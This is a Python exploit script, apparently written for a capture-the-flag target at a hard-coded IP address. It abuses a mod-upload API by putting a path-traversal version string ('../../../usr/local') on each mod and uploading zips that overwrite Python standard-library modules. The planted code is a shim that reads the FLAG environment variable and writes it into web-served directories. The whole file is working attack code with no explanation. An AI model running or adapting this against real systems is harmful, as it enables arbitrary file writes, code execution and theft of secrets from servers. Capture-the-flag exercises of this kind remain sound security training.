#!/usr/bin/env python3
import requests, sys, io, zipfile, secrets, time, re

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://144.79.188.39:42166"
if not BASE.startswith("http"):
    BASE = "http://" + BASE

def fresh():
    u = "u" + secrets.token_hex(4)
    pw = "Pass12345!"
    requests.post(f"{BASE}/api/auth/register/", json={"username": u, "password": pw}, timeout=15)
    r = requests.post(f"{BASE}/api/auth/login/", json={"username": u, "password": pw}, timeout=15)
    return r.json()["access"], u

def H(tok):
    return {"Authorization": f"Bearer {tok}"}

def get_or_create_plat(tok, code, name="z"):
    r = requests.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15).json()
    for it in (r.get("results", r) if isinstance(r, dict) else r) or []:
        if isinstance(it, dict) and it.get("code") == code:
            return it["id"]
    rp = requests.post(f"{BASE}/api/platforms/", headers=H(tok),
        json={"code": code, "name": name}, timeout=15)
    return rp.json().get("id")

print(f"[*] Target: {BASE}")

OUT = "flag_probe_" + secrets.token_hex(4) + ".txt"

SHIM = f"""import os as _os
try:
    with open('/usr/share/nginx/html/{OUT}', 'w') as _f:
        _f.write('FLAG=' + _os.environ.get('FLAG', 'NOFLAG') + '\\n')
except Exception:
    pass
try:
    with open('/data/media/{OUT}', 'w') as _f:
        _f.write('FLAG=' + _os.environ.get('FLAG', 'NOFLAG') + '\\n')
except Exception:
    pass
"""

CANDIDATES = [
    'decimal', 'fractions', 'ipaddress', 'statistics', 'numbers', 'cmath',
    'difflib', 'pprint', 'textwrap', 'gettext', 'calendar', 'keyword',
    'token', 'tokenize', 'ast', 'dis', 'bisect', 'graphlib', 'secrets',
    'getpass', 'uuid', 'tempfile', 'configparser', 'quopri', 'stringprep',
    'bz2', 'lzma', 'csv', 'tarfile', 'sqlite3', 'pydoc', 'inspect'
]

writable_modules = []
tok, u = fresh()
pid = get_or_create_plat(tok, "lib/python3.11")

for mod in CANDIDATES:
    tok_i, _ = fresh()
    pid_i = get_or_create_plat(tok_i, "lib/python3.11")
    mid_i = requests.post(f"{BASE}/api/mods/", headers=H(tok_i),
        json={"title":"z", "mod_version":"../../../usr/local", "release_notes":"", "is_enabled":True}, timeout=15).json().get("id")
    if not mid_i: continue
    bid_i = requests.post(f"{BASE}/api/mods/{mid_i}/builds/", headers=H(tok_i),
        json={"platform": pid_i}, timeout=15).json().get("id")
    if not bid_i: continue
    
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(f"{mod}.py", f"# Module {mod}\n{SHIM}")
    bio.seek(0)
    
    r = requests.post(f"{BASE}/api/mods/{mid_i}/builds/{bid_i}/upload/", headers=H(tok_i),
        files={"zip_file": ("p.zip", bio, "application/zip")}, timeout=15)
    
    print(f"  {mod}.py -> {r.status_code}")
    if r.status_code == 200:
        writable_modules.append(mod)

print(f"\n[*] Confirmed writable modules in /usr/local/lib/python3.11/ ({len(writable_modules)}):")
print(writable_modules)
